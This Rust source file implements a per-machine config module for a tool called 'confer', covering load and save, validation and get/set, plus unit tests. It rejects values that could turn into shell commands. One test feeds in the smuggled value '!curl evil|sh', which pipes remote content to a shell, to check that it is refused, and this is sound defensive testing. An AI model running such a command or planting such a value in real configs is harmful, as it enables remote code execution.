//! Machine-policy config — `~/.confer/config.json` (design/35). Per-MACHINE routing + tuning + update
//! posture that auto-joining/co-resident agents read instead of re-pasting a join cheat-sheet. This is
//! NOT the shared repo contract (`.confer-version` / `.confer-require` / roster) and NOT trust state
//! (hub identity pins live in `known_hubs`; role signing keys in the keyring). Confer-managed — nobody
//! hand-edits raw JSON; `confer config get/set/validate` is the surface.
//!
//! Phase 1 (this module): typed model + tolerant load / atomic-locked save + get/set/validate +
//! read-only accessors. It changes NO existing behavior — the clone/watch/update paths don't consume
//! these values yet (that's phase 2+). It only lets an operator record + inspect policy.

use crate::config;
use anyhow::{anyhow, Result};
use serde::{Deserialize, Deserializer, Serialize};
use serde_json::{Map, Value};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// Current structural schema version. Bumped ONLY on a breaking layout change, by migration code —
/// NEVER accepted from `config set`. A higher-major file from the future is read for what we know,
/// never refused; a malformed/absent version is treated as legacy `0`, never as a parse failure.
pub const CONFIG_VERSION: u64 = 1;

// ── model ───────────────────────────────────────────────────────────────────────────
// Every struct carries `#[serde(flatten)] extra` so a field this binary doesn't recognize is
// ROUND-TRIPPED on write, never silently dropped — mixed binary versions on one machine are the
// steady state (an old still-running `watch` + a new binary), and a naive typed rewrite that strips
// newer fields is the lost-update class the keyring lock exists to prevent. `doctor`/`validate` flag a
// non-empty `extra` as review material (a public-repo attacker can plant a field a future binary
// auto-promotes). Enum-like fields (`auth.method`, `watch`) are stored as String + classified in code
// (not closed serde enums) so ONE unrecognized value can't make the WHOLE file unparseable — the
// closed-set security property is enforced at validate + use, failing closed on anything unknown.

#[derive(Serialize, Deserialize, Default, Clone, Debug)]
pub struct Config {
    #[serde(default, deserialize_with = "de_lenient_u64")]
    pub version: u64,
    #[serde(default)]
    pub machine: Machine,
    #[serde(default)]
    pub update: Update,
    #[serde(default)]
    pub tuning: Tuning,
    #[serde(default)]
    pub hubs: BTreeMap<String, Hub>,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}

#[derive(Serialize, Deserialize, Default, Clone, Debug)]
pub struct Machine {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub clone_root: Option<String>,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Update {
    #[serde(default = "yes")]
    pub version_notice: bool,
    #[serde(default)]
    pub auto_update: bool,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}
impl Default for Update {
    fn default() -> Self {
        Self { version_notice: true, auto_update: false, extra: Map::new() }
    }
}

#[derive(Serialize, Deserialize, Default, Clone, Debug)]
pub struct Tuning {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub git_timeout_secs: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub op_budget_secs: Option<u64>,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}

#[derive(Serialize, Deserialize, Default, Clone, Debug)]
pub struct Hub {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scheme: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auth: Option<Auth>,
    /// `reactive` | `poll` | `off` — how a session auto-watches this hub (design/35). Absent → the
    /// tier-driven default is used by the (later) resolver.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub watch: Option<String>,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Auth {
    /// `ssh` | `confer-app` | `system` — validated by [`AuthMethod::parse`], NOT a closed serde enum
    /// (so an unknown value can't brick the whole file). A free-form credential-helper is deliberately
    /// impossible here: a git helper beginning with `!` is a shell command (RCE laundered through git).
    pub method: String,
    /// The transport key PATH (ssh) — a pointer, never a secret; git does the auth. Machine-wide
    /// default; a role needing a different key sets it in its own clone's git config.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key: Option<String>,
    #[serde(flatten)]
    pub extra: Map<String, Value>,
}

/// The closed set of auth methods. Kept as a real enum for exhaustive matching at USE sites, but the
/// config stores a String and routes through [`AuthMethod::parse`] — unknown → `None` → fail closed.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum AuthMethod {
    Ssh,
    ConferApp,
    System,
}
impl AuthMethod {
    pub fn parse(s: &str) -> Option<AuthMethod> {
        match s {
            "ssh" => Some(AuthMethod::Ssh),
            "confer-app" => Some(AuthMethod::ConferApp),
            "system" => Some(AuthMethod::System),
            _ => None,
        }
    }
}

/// Per-hub auto-watch posture. Same String-not-closed-enum treatment as auth method.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum WatchMode {
    Reactive,
    Poll,
    Off,
}
impl WatchMode {
    pub fn parse(s: &str) -> Option<WatchMode> {
        match s {
            "reactive" => Some(WatchMode::Reactive),
            "poll" => Some(WatchMode::Poll),
            "off" => Some(WatchMode::Off),
            _ => None,
        }
    }
}

fn yes() -> bool {
    true
}

/// Tolerate a `version` that is a string / float / negative / wrong-typed → `0` (legacy). NEVER errors,
/// so one bad field can't make the whole config unparseable (a red-team requirement: a malformed
/// version must fail no harder than the plain-text `.confer-version` it's morally equivalent to).
fn de_lenient_u64<'de, D: Deserializer<'de>>(d: D) -> std::result::Result<u64, D::Error> {
    Ok(Value::deserialize(d)?.as_u64().unwrap_or(0))
}

// ── bounds (red-team: an unbounded tuning value re-introduces the multi-minute-hang self-DoS) ──
pub const GIT_TIMEOUT_MAX_SECS: u64 = 120;
pub const OP_BUDGET_MAX_SECS: u64 = 300;

// ── load / save ───────────────────────────────────────────────────────────────────────

fn path() -> Result<PathBuf> {
    Ok(config::home()?.join(".confer").join("config.json"))
}

fn lock_path() -> Result<PathBuf> {
    Ok(config::home()?.join(".confer").join("config.lock"))
}

/// Tolerant read: any parse failure (missing file, non-JSON, a hard type error) degrades to defaults
/// rather than erroring a read path. Unknown fields are preserved via the `extra` bags.
pub fn load() -> Config {
    path()
        .ok()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|s| serde_json::from_str::<Config>(&s).ok())
        .unwrap_or_default()
}

/// Read-modify-write under the machine-local config lock — the CORRECT concurrency pattern: load and
/// save MUST be one critical section, or a co-resident writer's concurrent change is silently lost
/// (the class the keyring lock was added to prevent). Fail-closed if the lock can't be taken. The
/// closure mutates the loaded config; if it returns `Err`, NOTHING is written. Always stamps the
/// current `CONFIG_VERSION`.
pub fn update_with<T>(f: impl FnOnce(&mut Config) -> Result<T>) -> Result<T> {
    let p = path()?;
    if let Some(d) = p.parent() {
        std::fs::create_dir_all(d)?;
    }
    let _guard = config::state_lock(&lock_path()?)
        .ok_or_else(|| anyhow!("could not lock config (another confer is writing it) — try again"))?;
    let mut cfg = load(); // safe: we hold the lock, so no concurrent writer can race us
    let out = f(&mut cfg)?; // on Err, we return here WITHOUT writing
    write_locked(&p, &cfg)?;
    Ok(out)
}

/// The write half, assuming the lock is held. Also used by read-modify-write callers that already hold
/// the lock (so they don't re-lock and self-deadlock).
fn write_locked(p: &Path, cfg: &Config) -> Result<()> {
    let mut cfg = cfg.clone();
    cfg.version = CONFIG_VERSION;
    let tmp = p.with_extension("tmp");
    std::fs::write(&tmp, serde_json::to_string_pretty(&cfg)?)?;
    // Best-effort 0600 (routing + key paths are not for group/world eyes); non-fatal on odd FSes.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
    }
    std::fs::rename(&tmp, p)?; // atomic replace, no torn read
    Ok(())
}

// ── validation ──────────────────────────────────────────────────────────────────────

/// A validation finding — typed severity so nothing depends on matching message text (red-team: the
/// old string-prefix `is_advisory` was a stringly-typed gate one reword could silently flip). `hard`
/// = a malformed KNOWN field that must be fixed (blocks a `set`, exits `validate` non-zero); not-hard
/// = advisory (a preserved/unknown field — informational).
#[derive(Clone, Debug)]
pub struct Finding {
    pub field: String,
    pub message: String,
    pub hard: bool,
}
impl Finding {
    fn hard(field: impl Into<String>, message: impl Into<String>) -> Self {
        Self { field: field.into(), message: message.into(), hard: true }
    }
    fn advisory(field: impl Into<String>, message: impl Into<String>) -> Self {
        Self { field: field.into(), message: message.into(), hard: false }
    }
}

/// A value that would be dangerous to a future consumer regardless of which field it lands in: control
/// characters / newlines (arg/log injection), or a leading `!` (a git credential-helper `!cmd` is a
/// shell command — the RCE class the closed `auth.method` enum blocks; don't let it re-enter via
/// `url`/`auth.key`/`clone_root`). Returns the reason it's suspicious, or None.
fn suspicious_value(v: &str) -> Option<&'static str> {
    if v.chars().any(|c| c.is_control()) {
        Some("contains control characters")
    } else if v.starts_with('!') {
        Some("starts with '!' — a git helper `!cmd` is a shell command")
    } else {
        None
    }
}

/// Semantic checks that read-time (syntactic) parsing can't do. Never mutates. The expensive
/// reality-checks (key file exists + 0600, hub_key reconciles) live in `doctor`; this is the
/// value-shape layer shared by `config set` (pre-write, via `set_field`) and `config validate`.
pub fn validate(cfg: &Config) -> Vec<Finding> {
    let mut out = Vec::new();
    if cfg.version > CONFIG_VERSION {
        out.push(Finding::advisory(
            "version",
            format!("{} is newer than this binary understands ({CONFIG_VERSION}) — reading only known fields", cfg.version),
        ));
    }
    flag_extra(&cfg.extra, "", &mut out);
    flag_extra(&cfg.machine.extra, "machine", &mut out);
    flag_extra(&cfg.update.extra, "update", &mut out);
    flag_extra(&cfg.tuning.extra, "tuning", &mut out);
    if let Some(cr) = &cfg.machine.clone_root {
        if let Some(why) = suspicious_value(cr) {
            out.push(Finding::hard("machine.clone_root", why));
        }
    }
    if let Some(n) = cfg.tuning.git_timeout_secs {
        if n == 0 || n > GIT_TIMEOUT_MAX_SECS {
            out.push(Finding::hard("tuning.git_timeout_secs", format!("{n} out of range 1..={GIT_TIMEOUT_MAX_SECS}")));
        }
    }
    if let Some(n) = cfg.tuning.op_budget_secs {
        if n == 0 || n > OP_BUDGET_MAX_SECS {
            out.push(Finding::hard("tuning.op_budget_secs", format!("{n} out of range 1..={OP_BUDGET_MAX_SECS}")));
        }
    }
    for (name, hub) in &cfg.hubs {
        let at = |f: &str| format!("hubs.{name}.{f}");
        flag_extra(&hub.extra, &format!("hubs.{name}"), &mut out);
        if let Some(s) = &hub.scheme {
            if s != "ssh" && s != "https" {
                out.push(Finding::hard(at("scheme"), format!("'{s}' must be ssh or https")));
            }
        }
        if let Some(w) = &hub.watch {
            if WatchMode::parse(w).is_none() {
                out.push(Finding::hard(at("watch"), format!("'{w}' must be reactive, poll, or off")));
            }
        }
        if let Some(u) = &hub.url {
            if let Some(why) = suspicious_value(u) {
                out.push(Finding::hard(at("url"), why));
            }
        }
        if let Some(auth) = &hub.auth {
            flag_extra(&auth.extra, &format!("hubs.{name}.auth"), &mut out);
            if AuthMethod::parse(&auth.method).is_none() {
                out.push(Finding::hard(at("auth.method"), format!("'{}' must be ssh, confer-app, or system", auth.method)));
            }
            if let Some(k) = &auth.key {
                if let Some(why) = suspicious_value(k) {
                    out.push(Finding::hard(at("auth.key"), why));
                }
            }
        }
        if hub_name_normalized(name) != *name {
            out.push(Finding::hard(
                at(""),
                format!("hub name '{name}' is not normalized (expected '{}') — confusable/case risk", hub_name_normalized(name)),
            ));
        }
    }
    out
}

fn flag_extra(extra: &Map<String, Value>, prefix: &str, out: &mut Vec<Finding>) {
    for k in extra.keys() {
        let field = if prefix.is_empty() { k.clone() } else { format!("{prefix}.{k}") };
        out.push(Finding::advisory(field, "unrecognized field — preserved but NOT understood by this binary; review before trusting"));
    }
}

// The clamped accessors exist so the FIRST consumer (phase 3+) inherits bounded-ness by construction;
// nothing reads them yet, hence dead_code. Keeping them now fixes the "bounds enforced only at the CLI
// edit path" gap the red-team flagged, before any consumer can miss the re-validate.
#[allow(dead_code)]
impl Config {
    /// Bounded git-op timeout — clamps to the valid range so a consumer never inherits an
    /// out-of-range value from a config written by another tool (bounded-ness is a property of the
    /// TYPE, not of remembering to call `validate()` first — red-team). None → the caller's default.
    pub fn git_timeout_secs(&self) -> Option<u64> {
        self.tuning.git_timeout_secs.map(|n| n.clamp(1, GIT_TIMEOUT_MAX_SECS))
    }
    /// Bounded overall op budget — same clamping rationale as `git_timeout_secs`.
    pub fn op_budget_secs(&self) -> Option<u64> {
        self.tuning.op_budget_secs.map(|n| n.clamp(1, OP_BUDGET_MAX_SECS))
    }
}

/// Canonical form of a hub-name key: ASCII-lowercased. A name that isn't already normalized is flagged
/// (a homoglyph/case-variant key could otherwise sit as a distinct trusted entry — design/35). We only
/// case-fold here; non-ASCII is left intact but surfaced by the diff so `doctor` can show it.
pub fn hub_name_normalized(name: &str) -> String {
    name.to_ascii_lowercase()
}

// ── dotted-key get/set (the `confer config` surface) ──────────────────────────────────

/// Split a `hubs.<name>.<field>` remainder (after the `hubs.` prefix) into `(name, field)`, tolerating
/// a hub name that itself contains dots by stripping a KNOWN field suffix (the rest is the name).
fn split_hub_key(rest: &str) -> Option<(&str, &str)> {
    for suffix in ["auth.method", "auth.key", "url", "scheme", "watch"] {
        if let Some(name) = rest.strip_suffix(suffix).and_then(|s| s.strip_suffix('.')) {
            if !name.is_empty() {
                return Some((name, suffix));
            }
        }
    }
    None
}

/// Read the string rendering of the value at a dotted key, or `None` if unset/unknown.
pub fn get_field(cfg: &Config, key: &str) -> Option<String> {
    match key {
        "machine.clone_root" => cfg.machine.clone_root.clone(),
        "update.version_notice" => Some(cfg.update.version_notice.to_string()),
        "update.auto_update" => Some(cfg.update.auto_update.to_string()),
        "tuning.git_timeout_secs" => cfg.tuning.git_timeout_secs.map(|n| n.to_string()),
        "tuning.op_budget_secs" => cfg.tuning.op_budget_secs.map(|n| n.to_string()),
        _ => {
            let (name, field) = split_hub_key(key.strip_prefix("hubs.")?)?;
            // Normalize the looked-up name too (set enforces normalized keys; get should agree, not
            // read a stray non-normalized key from a hand-edited/older file).
            let hub = cfg.hubs.get(&hub_name_normalized(name))?;
            match field {
                "url" => hub.url.clone(),
                "scheme" => hub.scheme.clone(),
                "watch" => hub.watch.clone(),
                "auth.method" => hub.auth.as_ref().map(|a| a.method.clone()),
                "auth.key" => hub.auth.as_ref().and_then(|a| a.key.clone()),
                _ => None,
            }
        }
    }
}

/// Result of a `set_field`: `gated` carries a human reason when the change is security-sensitive and
/// must be confirmed with `--yes`.
pub struct SetOutcome {
    pub gated: Option<String>,
}

/// Apply `key = val` to `cfg`, validating the value and reporting whether the change is
/// security-gated. Errors (without mutating meaningfully) on an unknown key or an invalid value.
pub fn set_field(cfg: &mut Config, key: &str, val: &str) -> Result<SetOutcome> {
    let mut gated: Option<String> = None;
    match key {
        "machine.clone_root" => {
            if let Some(why) = suspicious_value(val) {
                return Err(anyhow!("clone_root {why}"));
            }
            gated = Some("clone_root re-homes where clones live; existing clones may need migration".into());
            cfg.machine.clone_root = Some(val.to_string());
        }
        "update.version_notice" => cfg.update.version_notice = parse_bool(val)?,
        "update.auto_update" => {
            let on = parse_bool(val)?;
            if on {
                gated = Some("auto_update lets a hub-advertised version pin drive a build+exec".into());
            }
            cfg.update.auto_update = on;
        }
        "tuning.git_timeout_secs" => cfg.tuning.git_timeout_secs = Some(parse_bounded(val, GIT_TIMEOUT_MAX_SECS)?),
        "tuning.op_budget_secs" => cfg.tuning.op_budget_secs = Some(parse_bounded(val, OP_BUDGET_MAX_SECS)?),
        _ => {
            let rest = key
                .strip_prefix("hubs.")
                .ok_or_else(|| anyhow!("unknown config key '{key}' — see `confer config schema`"))?;
            let (name, field) = split_hub_key(rest)
                .ok_or_else(|| anyhow!("unknown hub field in '{key}' — see `confer config schema`"))?;
            if name != hub_name_normalized(name) {
                return Err(anyhow!("hub name must be normalized (lowercase): use '{}'", hub_name_normalized(name)));
            }
            if !cfg.hubs.contains_key(name) {
                gated = Some(format!("adds a new hub block '{name}' — routing for a hub this machine will trust"));
            }
            let hub = cfg.hubs.entry(name.to_string()).or_default();
            match field {
                "url" => {
                    if let Some(why) = suspicious_value(val) {
                        return Err(anyhow!("url {why}"));
                    }
                    gated.get_or_insert_with(|| "a hub url is trust-relevant routing".into());
                    hub.url = Some(val.to_string());
                }
                "scheme" => {
                    if val != "ssh" && val != "https" {
                        return Err(anyhow!("scheme must be ssh or https"));
                    }
                    hub.scheme = Some(val.to_string());
                }
                "watch" => {
                    if WatchMode::parse(val).is_none() {
                        return Err(anyhow!("watch must be reactive, poll, or off"));
                    }
                    hub.watch = Some(val.to_string());
                }
                "auth.method" => {
                    if AuthMethod::parse(val).is_none() {
                        return Err(anyhow!("auth.method must be ssh, confer-app, or system"));
                    }
                    gated.get_or_insert_with(|| "auth.method controls how this hub authenticates".into());
                    hub.auth.get_or_insert_with(default_auth).method = val.to_string();
                }
                "auth.key" => {
                    if let Some(why) = suspicious_value(val) {
                        return Err(anyhow!("auth.key {why}"));
                    }
                    gated.get_or_insert_with(|| "auth.key selects the transport key path".into());
                    hub.auth.get_or_insert_with(default_auth).key = Some(val.to_string());
                }
                _ => return Err(anyhow!("unknown hub field '{field}'")),
            }
        }
    }
    Ok(SetOutcome { gated })
}

fn default_auth() -> Auth {
    Auth { method: "ssh".into(), key: None, extra: Map::new() }
}

fn parse_bool(s: &str) -> Result<bool> {
    match s {
        "true" | "1" | "yes" | "on" => Ok(true),
        "false" | "0" | "no" | "off" => Ok(false),
        _ => Err(anyhow!("expected a boolean (true/false), got '{s}'")),
    }
}

fn parse_bounded(s: &str, max: u64) -> Result<u64> {
    let n: u64 = s.parse().map_err(|_| anyhow!("expected a positive integer, got '{s}'"))?;
    if n == 0 || n > max {
        return Err(anyhow!("value {n} out of range 1..={max}"));
    }
    Ok(n)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_and_missing_load_as_default() {
        let c: Config = serde_json::from_str("{}").unwrap();
        assert_eq!(c.version, 0);
        assert!(c.hubs.is_empty());
        assert!(c.update.version_notice); // defaulted true
        assert!(!c.update.auto_update);
    }

    #[test]
    fn unknown_fields_are_preserved_not_dropped() {
        // A newer binary's field this (older) binary doesn't know must round-trip, not vanish.
        let raw = r#"{"version":1,"machine":{"clone_root":"~/x","future_knob":42},"brand_new_section":{"a":1}}"#;
        let c: Config = serde_json::from_str(raw).unwrap();
        assert_eq!(c.machine.clone_root.as_deref(), Some("~/x"));
        assert!(c.extra.contains_key("brand_new_section"));
        assert!(c.machine.extra.contains_key("future_knob"));
        // round-trips through serialize
        let back = serde_json::to_string(&c).unwrap();
        assert!(back.contains("brand_new_section"));
        assert!(back.contains("future_knob"));
        // and validate flags both as review material (advisory, not hard)
        let findings = validate(&c);
        assert!(findings.iter().any(|f| f.field == "brand_new_section" && !f.hard));
        assert!(findings.iter().any(|f| f.field == "machine.future_knob" && !f.hard));
    }

    #[test]
    fn malformed_version_is_legacy_zero_not_a_parse_failure() {
        for bad in [r#"{"version":"soon"}"#, r#"{"version":-3}"#, r#"{"version":1.9}"#] {
            let c: Config = serde_json::from_str(bad).unwrap_or_else(|e| panic!("{bad} should parse: {e}"));
            assert_eq!(c.version, 0, "{bad}");
        }
    }

    #[test]
    fn an_unknown_auth_method_does_not_brick_the_file() {
        // The whole config must still parse; the bad method is caught by validate, not by deser.
        let raw = r#"{"hubs":{"h":{"auth":{"method":"totally-made-up"}}}}"#;
        let c: Config = serde_json::from_str(raw).unwrap();
        assert!(AuthMethod::parse(&c.hubs["h"].auth.as_ref().unwrap().method).is_none());
        let findings = validate(&c);
        assert!(findings.iter().any(|f| f.field == "hubs.h.auth.method" && f.hard));
    }

    #[test]
    fn tuning_bounds_and_scheme_and_watch_validated() {
        let raw = r#"{"tuning":{"git_timeout_secs":999999,"op_budget_secs":0},
                      "hubs":{"h":{"scheme":"carrier-pigeon","watch":"sometimes"}}}"#;
        let c: Config = serde_json::from_str(raw).unwrap();
        let f: Vec<String> = validate(&c).into_iter().map(|x| x.field).collect();
        assert!(f.iter().any(|k| k == "tuning.git_timeout_secs"));
        assert!(f.iter().any(|k| k == "tuning.op_budget_secs"));
        assert!(f.iter().any(|k| k == "hubs.h.scheme"));
        assert!(f.iter().any(|k| k == "hubs.h.watch"));
    }

    #[test]
    fn suspicious_values_rejected_on_set_and_flagged_hard_on_validate() {
        let mut c = Config::default();
        // leading '!' (git helper = shell command) and control chars are refused by set_field
        assert!(set_field(&mut c, "hubs.h/x.url", "!curl evil|sh").is_err());
        assert!(set_field(&mut c, "machine.clone_root", "a\nb").is_err());
        assert!(set_field(&mut c, "hubs.h/x.auth.key", "\u{7}key").is_err());
        // a hand-written config carrying such a value is flagged HARD by validate
        let raw = r#"{"hubs":{"h":{"url":"!evil"}}}"#;
        let cc: Config = serde_json::from_str(raw).unwrap();
        assert!(validate(&cc).iter().any(|f| f.field == "hubs.h.url" && f.hard));
    }

    #[test]
    fn tuning_accessors_clamp_out_of_range() {
        let raw = r#"{"tuning":{"git_timeout_secs":999999,"op_budget_secs":0}}"#;
        let c: Config = serde_json::from_str(raw).unwrap();
        assert_eq!(c.git_timeout_secs(), Some(GIT_TIMEOUT_MAX_SECS)); // clamped down from 999999
        assert_eq!(c.op_budget_secs(), Some(1)); // 0 clamped up to the min
    }

    #[test]
    fn normalized_names_flagged() {
        assert_eq!(hub_name_normalized("Codeshrew/Agent-Coord"), "codeshrew/agent-coord");
        let raw = r#"{"hubs":{"Codeshrew/Agent-Coord":{}}}"#;
        let c: Config = serde_json::from_str(raw).unwrap();
        assert!(validate(&c).iter().any(|x| x.message.contains("not normalized")));
    }
}
